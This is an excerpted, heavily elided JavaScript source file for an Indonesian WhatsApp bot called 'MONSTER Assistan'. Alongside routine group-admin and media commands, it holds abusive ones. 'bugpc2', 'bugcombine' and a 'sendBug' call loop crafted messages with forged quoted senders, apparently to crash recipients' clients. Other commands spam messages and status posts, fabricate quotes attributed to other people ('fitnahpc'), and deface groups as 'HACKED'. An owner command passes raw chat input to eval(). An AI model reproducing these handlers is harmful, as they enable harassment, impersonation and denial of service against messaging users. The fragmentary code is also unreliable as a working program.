await MONSTER.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
				case 'antiwame':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			...
			if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (args[0] === 'on') {
						...
						MONSTER.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti wa.me\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
...
await MONSTER.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
			...
			if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (args[0] === 'on') {
						...
						MONSTER.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
...
await MONSTER.sendMessage(from, btasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
          break
				case 'tinyurl':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
case 'tts':
        ...
        if (args.length < 2) return MONSTER.sendMessage(from, 'Textnya mana gan?', text, {quoted: mek})
        ngab = budy.slice(7)
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ...
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                ...
                MONSTER.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
...
break 
		    ...
		    MONSTER.groupDemoteAdmin(from, [demote])
		    ...
		    MONSTER.groupMakeAdmin(from, [promote])
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					linkgc = await MONSTER.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					MONSTER.sendMessage(from, yeh, text, { quoted: mek })
					break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
         ...
         MONSTER.query({json, expect200: true})
...
await MONSTER.sendMessage(from, bMess, MessageType.buttonsMessage, {quoted: ftrol})
break
					case 'opengc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
				...
				for (let i = 0; i < argzi[1]; i++){
					MONSTER.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return sticOwner(from)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                MONSTER.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !mek.key.fromMe) return sticOwner(from)
		if (!isGroup) return reply(mess.only.group)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                MONSTER.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
              if (!isBotGroupAdmins) return sticNotAdmin(from)
					MONSTER.groupUpdateSubject(from, `${body.slice(11)}`)
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					MONSTER.groupUpdateDescription(from, `${body.slice(10)}`)
				...
				if (!isQuotedImage) return reply('Reply imagenya!')
					...
					mediau = await MONSTER.downloadAndSaveMediaMessage(enmediau)
					await MONSTER.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				...
				case 'bc':
					...
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						...
						buff = await MONSTER.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							MONSTER.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						...
						buff = await MONSTER.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							MONSTER.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await MONSTER.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							MONSTER.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
...
await MONSTER.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
						}
...
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				...
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					MONSTER.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    MONSTER.sendMessage('status@broadcast', teks, MessageType.text)
...
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    MONSTER.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`MONSTER Assistan`}, MessageType.location)
...
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						...
						buff = await MONSTER.downloadMediaMessage(encmedia)
						MONSTER.sendMessage('status@broadcast', buff, sticker)
						}
...
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						...
						buff = await MONSTER.downloadMediaMessage(encmedia)
						MONSTER.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
...
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await MONSTER.downloadMediaMessage(encmedia)
						MONSTER.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
...
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					...
					var mediap = await MONSTER.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    MONSTER.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
...
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					...
					media = await MONSTER.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    MONSTER.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    ...
                    MONSTER.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				return MONSTER.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'tomp4':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            ...
            case 'tomp3':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					mediad = await MONSTER.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						MONSTER.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
...
break
            ...
            break
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await MONSTER.groupMetadata(anu)
				MONSTER.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getbio':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await MONSTER.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
...
const sname = MONSTER.contacts[ambl] != undefined ? MONSTER.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : MONSTER.contacts[ambl].notify || MONSTER.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
            ...
            pictt = await MONSTER.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            MONSTER.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            ...
            var org = pc.split("|")[1];
            MONSTER.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
				case 'attp':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp MONSTER Assistan`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					MONSTER.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
                case 'ttp':  
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp MONSTER Assistan`)
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${c}`)
                    MONSTER.sendMessage(from, anu1, image, {quoted: mek, caption : `${prefix}sticker`})
                    break
				case 'semoji':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    	   ...
    	   break
            ...
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					MONSTER.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					MONSTER.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join': 
            ...
            file = await MONSTER.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await MONSTER.groupMetadata(from)
            ...
            MONSTER.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            MONSTER.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            MONSTER.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            MONSTER.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            MONSTER.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await MONSTER.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
...
case 'stats':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				var groups = MONSTER.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = MONSTER.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					...
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = MONSTER.user.phone
					stamtus = `⍟ ────────────────── ⍟
...
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${MONSTER.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${MONSTER.user.phone.wa_version}
Os Version: ${MONSTER.user.phone.os_version}
...
break
				...
				MONSTER.updatePresence(from, Presence.composing)
					...
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						...
						buff = await MONSTER.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							MONSTER.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await MONSTER.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							MONSTER.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
...
var nn = body.slice(9)
           ...
           case 'fitnahpc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				var bot = gh.split("|")[2];
			    MONSTER.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
            case 'hidetag':
            case 'h':
            if (!isOwner && !mek.key.fromMe) return sticOwner(from)
            ...
            if (!isGroup) return reply(mess.only.group)
				...
				MONSTER.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              if (!isGroup) return reply(mess.only.group)
              ...
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   MONSTER.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                MONSTER.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                MONSTER.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                MONSTER.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
					case 'hack':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
              if (!isGroup) return reply(mess.only.group)
              ...
              if (!isBotGroupAdmins) return sticNotAdmin(from)
              sendBug(from)
              MONSTER.groupUpdateSubject(from, `HACKED BY MONSTER Assistan`)
                MONSTER.groupUpdateDescription(from, `_${me.jid}_`)
             MONSTER.updateProfilePicture(from, fs.readFileSync('./media/image/thumb.jpg'))
                MONSTER.sendMessage(from, 'Succes!', text, {quoted: mek})
                await sleep(3000)
                MONSTER.groupLeave(from)
					break
					case 'bugpc2':
...
for (let i = 0; i < args[0]; i++) {
MONSTER.sendMessage(from, `MONSTER Assistan`, MessageType.extendedText,{
 quoted: {
key: {
...
MONSTER.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
...
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `MONSTER Assistan`
		        var grousp = await MONSTER.groupMetadata(from)
		        ...
		        for (let i = 0; i < args[0]; i++) {
		        MONSTER.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
		          ...
		          for(let i=0;i<10;i++){
		        MONSTER.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
...
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                 MONSTER.toggleDisappearingMessages(from, 'HACKED')
MONSTER.sendMessage(from, `MONSTER Assistan`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
...
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
MONSTER.updatePresence(from, Presence.composing)
		       MONSTER.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NamaOwner}`,
						address: `MONSTER Assistan`,
...
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
MONSTER.updatePresence(from, Presence.composing)
MONSTER.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
...
*🏴‍☠️ Link:* ${items[i].url}\n\n`
                ...
                await MONSTER.sendMessage(from, thumb, image, {quoted: ftrol, caption: `${hehe}───────────────\n
*🏴‍☠️ DOWNLOAD*
...
Link : ${get_resultP.url_audio}
            `
            MONSTER.sendMessage(from, textP, text,{contextInfo:{
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
            ...
            MONSTER.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, filename: `${get_resultP.title}.mp3`, quoted: mek})
            break
                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await MONSTER.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									...
									.on('end', function () {
										...
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											...
											MONSTER.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
			...
			case 'ping':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				if (!isOwner) return sticOwner(from)
					return MONSTER.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return MONSTER.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
                 break
                 case 'toimg':
				case 'tomedia':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await MONSTER.downloadAndSaveMediaMessage(encmedia)
              ...
              sticWait(from)
				...
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					...
					MONSTER.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					...
					MONSTER.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					...
					MONSTER.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					try {
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					MONSTER.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await MONSTER.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				...
				MONSTER.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				runtime = process.uptime()
			...
			if (!isGroup) return reply(mess.only.group)
				...
				if (mek.message.extendedTextMessage != undefined){
					...
					MONSTER.groupCreate(argz[0], anu)
...
await MONSTER.sendMessage(from, btngrass, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
			case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
...
Giliran = @${tty.player1.split('@')[0]}`
  MONSTER.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
...
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
MONSTER.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}
...
${ttt}`
MONSTER.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
...
${ttt}`
MONSTER.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
...
Giliran = @${tty.player1.split('@')[0]}`
 MONSTER.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
     ...
     MONSTER.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer MONSTER Assistan",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./thumb.jpg'),sourceUrl:"https://wa.me/p/6349482305092740/6281220670449"}}})
	}
    }
    }
    }
